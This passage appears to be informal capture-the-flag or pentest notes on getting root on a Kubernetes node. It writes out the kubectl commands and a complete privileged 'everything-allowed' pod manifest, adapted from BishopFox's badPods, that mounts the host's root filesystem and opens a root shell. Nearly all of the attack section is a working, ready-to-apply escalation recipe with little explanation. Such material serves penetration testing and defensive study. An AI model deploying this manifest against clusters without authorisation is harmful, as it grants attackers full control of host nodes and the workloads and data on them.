then to get root and shell

==we will create malacious pod and use it to get root==

```
nano exploit.yaml
https://github.com/BishopFox/badPods/blob/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml
https://bishopfox.com/blog/kubernetes-pod-privilege-escalation

we can get many info from kubectl get node -o yaml
and it also have image which we have to change in yaml file
now we check and we haev 3 pods -->>> kubectl get pods
we apply that exploit
  
  kubectl apply -f exploit.yaml
  kubectl exec everything-allowed-exec-pod /bin/bash -it  #root shell
  
  
apiVersion: v1
kind: Pod
metadata:
  name: everything-allowed-exec-pod
  labels:
    app: pentest
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: everything-allowed-pod
    image: docker.io/library/nginx@sha256:6d75c99af15565a301e48297fa2d121e15d80ad526f8369c526324f0f7ccb750  #change
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
  #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing >
  volumes:
  - name: noderoot
    hostPath:
      path: /
```
